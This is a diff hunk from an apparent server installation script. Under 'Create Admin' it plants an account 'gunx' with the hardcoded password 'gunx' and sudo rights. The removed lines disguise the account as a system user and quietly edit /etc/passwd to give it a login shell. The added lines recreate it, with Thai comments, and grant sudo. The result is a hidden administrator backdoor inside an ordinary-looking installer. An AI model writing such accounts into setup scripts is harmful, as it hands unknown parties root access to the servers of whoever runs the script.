@@ -127,9 +127,11 @@ pip3 install speedtest-cli
 
 #Create Admin
 
- sudo useradd -u 9 -g 9 -c "gunx" -d /var/spool/gunx -s /usr/sbin/nologin gunx
-sed -i 's/gunx:x:9:9:gunx:\/var\/spool\/gunx:\/usr\/sbin\/nologin/gunx:x:9:9:gunx:\/home:/g' /etc/passwd
-echo gunx:gunx | chpasswd
+ # เพิ่มผู้ใช้งาน "gunx" โดยกำหนด GID เป็น 65534
+useradd -g 65534 gunx
+
+# ส่งรหัสผ่านให้กับผู้ใช้งาน "gunx" ผ่านคำสั่ง passwd
+echo "gunx:gunx" | chpasswd
 usermod -aG sudo gunx
 }
 fun_bar 'inst_pct'
